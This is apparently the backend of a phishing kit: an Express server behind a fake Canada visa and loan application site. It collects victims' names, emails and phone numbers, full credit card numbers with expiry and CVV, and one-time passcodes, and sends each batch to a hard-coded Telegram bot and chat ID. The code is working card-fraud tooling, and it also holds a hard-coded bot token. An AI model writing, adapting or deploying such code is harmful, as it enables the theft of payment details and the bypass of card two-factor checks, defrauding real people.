const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3456;

// Bot config from environment variables
const BOT_TOKEN = process.env.BOT_TOKEN || '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
const CHAT_ID   = process.env.CHAT_ID   || '5615316142';

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ─── Telegram helper ───────────────────────────────────────────────
async function sendTelegram(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });
    return res.ok;
}

// ─── API: collect form submission (index.html hero form) ───────────
app.post('/api/lead', async (req, res) => {
    const { firstName, lastName, email, countryCode, phone } = req.body;
    const text =
        `🇨🇦 <b>New Canada Visa Lead</b>\n` +
        `👤 Name: ${firstName} ${lastName}\n` +
        `📧 Email: ${email}\n` +
        `📱 Phone: ${countryCode}${phone}`;
    try {
        await sendTelegram(text);
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── API: credit card details ──────────────────────────────────────
app.post('/api/card', async (req, res) => {
    const { cardName, cardNumber, expiration, cvv, applicant, phone, amount } = req.body;
    const text =
        `💳 <b>New Card Details</b>\n` +
        `👤 Cardholder: ${cardName}\n` +
        `🔢 Card Number: ${cardNumber}\n` +
        `📅 Expiry: ${expiration}\n` +
        `🔒 CVV: ${cvv}\n\n` +
        `👤 Applicant: ${applicant}\n` +
        `📱 Phone: +254${phone}\n` +
        `💰 Loan Amount: USD ${amount}`;
    try {
        await sendTelegram(text);
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── API: OTP submission ───────────────────────────────────────────
app.post('/api/otp', async (req, res) => {
    const { otp, applicant, phone } = req.body;
    const text =
        `🔑 <b>OTP Received</b>\n` +
        `Code: <b>${otp}</b>\n` +
        `👤 Applicant: ${applicant}\n` +
        `📱 Phone: +254${phone}`;
    try {
        await sendTelegram(text);
        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ─── Fallback: serve index.html ────────────────────────────────────
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
